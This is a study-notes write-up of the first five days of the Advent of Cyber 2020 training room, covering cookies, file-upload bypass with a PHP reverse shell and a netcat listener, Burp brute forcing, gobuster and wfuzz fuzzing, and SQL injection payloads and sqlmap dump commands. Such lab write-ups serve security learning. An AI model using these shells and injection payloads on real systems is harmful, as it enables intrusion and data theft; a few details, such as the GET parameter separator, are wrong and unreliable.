<h1 align="center">Advent of Cyber 2</h1>

<p>This is a five-part write-up for AoC 2020 room.</p>

# Days
|[1](#a-christmas-crisis)|[2](#the-elf-strikes-back!)|[3](#christmas-chaos)|[4](#santa's-watching)|[5](#someone-stole-santa's-gift-list!)|
|:-:|:-:|:-:|:-:|:-:|:-:|
|[6]()|[7]()|[8]()|[9]()|[10]()|
|[11]()|[12]()|[13]()|[14]()|[15]()|
|[16]()|[17]()|[18]()|[19]()|[20]()|
|[21]()|[22]()|[23]()|[24]()|

# A Christmas Crisis
## Topic and concepts
Web exploitation, Web, HTTPS, Cookies.<br>
* Finding cookies name in Developer Tools
* Recognizing data formats
* Creating hexadecimal data
* JSON
* Authentication
## Walkthroughs
Access cookies with Developer Tools:<br>
navigate to `Storage`/`Application` and 
select `Cookies`.<br>
Access Developer Tools:<br>
`F12` or `Ctrl Shift I` <br>
## Commands
None.
## Useful information
HTTP requests always have a target and a method.<br>
The method used to retrieve information is called the GET method.<br>
The POST method sends data to the server.<br>
HTTM is a stateless protocol : no data persists between two requests.<br>
Cookies are tiny pieces of information stored on computers sent along every 
requests made.<br>
A site can only access cookies associated with its own domain.<br>
Cookies are stored locally.<br>
Editing a session cookie can lead to a PrivEsc assuming there is an access to
an Administrator's authorisation cookie.<br>
## Ressources
[Cyberchef](https://gchq.github.io/CyberChef/): Strings decoder<br>

# The Elf Strikes Back!
## Topic and concepts
Web exploitation, GET parameters and URLs, File uploads, Reverse shells, Reverse 
shells listeners.<br>
* Bypassing file upload filters
* Uploading reverse shells
* Finding uploaded files directories
* `Netcat`
* GET parameters
* Remote Command Execution
* File extension filtering
* Double-barrelled extension
<!-- ## Goals
None. -->
## Walkthroughs
Set up a reverse shell: <br>
Copy the webshell in a local directory, change `ip` and `port` variables to 
those of the local machine (port 443 is used in the example), upload it onto the
website with a double-barrelled extension. Then, execute it by navigating to the
file in the browser.<br>
## Commands
Set up a reverse shell listener:
```
sudo nc -lvnp 443
```
## Useful information
The data being sent with POST requests is included in the body of the request 
whereas it is in the URL as a parameter with GET requests.<br>
In the different parts making up a URL, the ressource is the one after the 
TLD.<br>
All homepages must be called index in order to be correctly served by the 
server.<br>
GET parameter structure (ex: `?snack=mincePie`): `?` specifies a GET parameter 
is forthcoming, `=` indicates the value will come next. If there's more than one
parameter, `?` would seperate them.<br>
It's not uncommon to find file uploads using flawed filtering techniques. They 
can be circumvented by scripts. Most websites are still written with a PHP 
back-end.<br>
Oftentimes, upload system scritpts are uploaded to a directory that can be 
accessed remotely. <br>
A reverse shell creates a connection from the server to a local machine.<br>
## Ressources
[php-reverse-shell.php](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php): 
PHP reverse shell script raw file

# Christmas Chaos
## Topic and concepts
Authentication, Default credentials, Dictionary attacks with `BurpSuite`.<br>
* Intercepting traffic
* Automating customize web attacks
* Brute forcing a login form
* `BurpSuite` Community
* Payloads
* Login form bypass with `BurpSuite`
* `Hydra`
## Walkthroughs
Perform a dictionary attack: <br>
Launch `Burp`. Intercept traffic by proxying it through `BurpSuite`, which can be 
done by first opening a webpage (with `Burp`'s own browser or the help of 
`FoxyProxy`), clicking on `Intercept is off` on the `Intercept` tab of `Burp` 
and then navigating on the chosen website. Submit details into the form on the 
webpage. Right-click the recently captured request and click on 
`Send to intruder`. Go to the `Intruder` tab, click on `Positions`, clear 
pre-selected positions, add values as positions and select `Cluster Bomb` in the 
dropdown menu. Click on `Payloads`, select the payload set (first one being the 
username field, the second the password field), add common default usernames in 
set 1 and passwords in set 2. Finally, click on `Start Attack` and analyse 
combinations.
## Commands
None.
## Useful information
Authentication is the process of verifying a user's identity, usually with 
credentials. Authorization, on the other hand, determines what a user can and 
cannot access.<br>
It is useful to sort combinations by length or status as typically, incorrect 
logins have the same status or length.<br>
## Ressources
[SecLists](https://github.com/danielmiessler/SecLists/): Collection of common 
lists including usernames, passwords, URLs,...

# Santa's watching
## Topic and concepts
Fuzzing, `gobuster` use, `wfuzz` use.<br>
* Authorization
* API
* Enumerating a web server for hidden files
* Enumerating a web server for hidden folders
* Error conditions
* Fuzzing datestamps
* Finding the specific name of a directory
* Fuzzing with GET parameters
* Using `gobuster` with directories
* Wordlists
* `gobuster` modes 
## Useful information
Fuzzing is using tools to automate the input of data provided into things (such
as websites or software applications).<br>
`gobuster` is faster than `dirbuster`.<br>
`SecLists` has wordlists for specific applications and platforms.<br>
`big.txt` is the recommened wordlist to use.<br>
The default location for wordlist is `/usr/share/wordlists`.<br>
With `wfuzz`, you can fuzz any part of the URL.<br>
`gobuster` finds directory names whereas `wfuzz` find directories where a 
certain file is (among other things).<br>
`wfuzz -d` fuzzes POST requests.<br>
## Walkthroughs
Run `gobuster` in directory mode:
```
gobuster dir <command>
```
Specify url to enumerate/wordlist appended on the url path/file extension:
```
gobuster -u <url>
gobuster -w file,<wordlist-path>
gobuster -x <file-extension>
```
Run `wfuzz` with the output in color:
```
wfuzz -c
```
Run `wfuzz` without certain http response codes/amount of lines/amount of 
characters/amount of words in the response:
```
wfuzz -hc <number>
wfuzz -hl <number>
wfuzz -hc <number>
wfuzz -hw <number>
```
Specify the parameter to fuzz with/what will replace FUZZ in the request/the
url:
```
wfuzz -d "<post-request>=FUZZ&<post-request>=FUZZ"
wfuzz -z <wordlist-path>
wfuzz -u <url-to-fuzz>
```
## Ressources
[gobuster](https://github.com/OJ/gobuster) GitHub webpage<br>
[gobuster man](http://manpages.ubuntu.com/manpages/cosmic/man1/gobuster.1.html): 
man page of `gobuster`<br>
`/usr/share/wordlists`: Default location for wordlists on Kali Linux<br>
[wfuzz](https://github.com/xmendez/wfuzz) GitHub webpage<br>
[wfuzz man](https://manpages.debian.org/buster/wfuzz/wfuzz.1.en.html): man page 
of `wfuzz`<br>
[wfuzz ReadTheDocs](http://wfuzz.readthedocs.io/): `wfuzz` documentation<br>
[AoC-Advent2020](https://assets.tryhackme.com/additional/cmn-aoc2020/day-4/wordlist): 
Advent of Cyber wordlist (containg among other things YYYYDDMM datestamps)<br>
[SecLists](https://github.com/danielmiessler/SecLists): different wordlists.<br>

# Someone stole Santa's gift list! 
## Topic and concepts
SQL injection, Login bypass with SQL injection, Blind SQL injection, Union SQL 
injection, `SQLMap`, `SQLMap` & `BurpSuite`.<br>
* Dumping data
* Different SQL login queries
* Database enumeration
* Stages of an UNION SQLi attack
* Determining the number of columns required in a SQLi UNION attack
* Meaning of no error when determining number of columns
* Finding columns with useful data in SQLi UNION attack
* `UNION SELECT` payloads
* Meaning of no error when finding useful data type
* Retrieving interesting data with SQLi UNION attack
* Common options for `SQLMap`
* Web Application Firewall
## Walkthroughs
Carry out a UNION SQLi attack:<br>
Find the number of columns, check if the columns are suitable and attack and get
some intereseting data.<br>
Run `sqlmap` with `BurpSuite`:<br>
Intercept requests on `BurpSuite`. Submit a request on the website. Right-click 
the request and press `Send to repeater`. Go to the `Repeater tab`, right-click 
the request and press `Save item`. Finally, use the request in `sqlmap`.
## Commands
Ways to bypass the login:
```
') or true-
' or true --
```
to insert in the username field.<br>
Find 
* the number of entries
* what Paul asked for
* the flag
* the admin password
```
python sqlmap.py -r ./request --dbms=sqlite --tamper=space2comment --dump-all
```
Select data/all from a database:
```
SELECT <data>
SELECT *
```
Specify which table to select or delete data from:
```
FROM <table>
```
Extract only those records fulfilling a specified condition:
```
WHERE <data><operator><value>
```
Combine the result or set of two or more SELECT statements:
```
UNION SELECT <...>
```
Blind SQLi payload:
```
?<parameter>=1' AND (ascii(substr((select database()), 1, 1))) = 115 --+
```
`ORDER BY` queries:
```
' ORDER BY 1-- ' ORDER BY 2-- ' ORDER BY 3-- # and so on until an error occurs 
```
`UNION SELECT` queries:
```
' UNION SELECT NULL-- ' UNION SELECT NULL,NULL-- ' UNION SELECT NULL,NULL,NULL-- # until the error occurs
```
Find columns with a useful data type:
```
' UNION SELECT 'a',NULL,NULL,NULL-- ' UNION SELECT NULL,'a',NULL,NULL-- ' UNION SELECT NULL,NULL,'a',NULL-- ' UNION SELECT NULL,NULL,NULL,'a'--
```
Retrieve the content of the user's table:
```
' UNION SELECT username, password FROM users --
```
in a database with 2 columns with useful datatype and containing a table called 
users with the columns username and password.<br>
Provide a URL for a SQLi attack with `sqlmap`:
```
sqlmap --url <url>
```
Tell `sqlmap` the type of database running/to run automatically:
```
sqlmap --dbms=<database-type>
sqlmap --batch
```
Dump the data within the database that the application uses/the entire database:
```
sqlmap --dump
sqlmap --dump-all
```
Enumerate tables/columns in the application's database:
```
sqlmap --tables
sqlmap --columns
```
Use a request in `sqlmap`:
```
sqlmap -r <filename>
```
Bypass WAF:
```
sqlmap --tamper=space2comment
```
## Useful information
1=1 Stands for True.<br>
SQLi is carried out through abusing a PHP GET parameter.<br>
The error used to exploit the SQLi is a quotation mark provided in the username 
input. SQLi is an arrack in which the goal is to break SQL execution logic, 
inject another and then fix the broken part by adding comments at the end.<br>
Most commonly used comments for SQLi payloads are `--+`, `//` and `/*`.<br>
Login bypassing is ONE application of SQLi. Not all login applications use 
PHP.<br>
Blind SQL i is carried out through asking Yes or No questions to the database. 
No means error, Yes means no error.<br>
The number of columns required in a UNION SQLi attack are detected by either
- injecting a series of ORDER BY queries until an error occurs
or
- submitting a series of UNION SELECT payloads with a number of NULL values. 
<br>The use of the latter is recommended.<br>

Things to retrieve in a UNION SQLi:
- database()
- user()
- @@version
- username
- password
- table_name
- column_name
<br>`sqlmap` is a tool that automates the process of detecting and exploiting SQLi
flaws.<br>
## Ressources
[SQL commands](https://www.codecademy.com/articles/sql-commands): List of SQL 
commands<br>
[SQL injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection): 
SQL injection cheatsheet<br>
[SQL injection payloads list](https://github.com/payloadbox/sql-injection-payload-list): 
Payloads list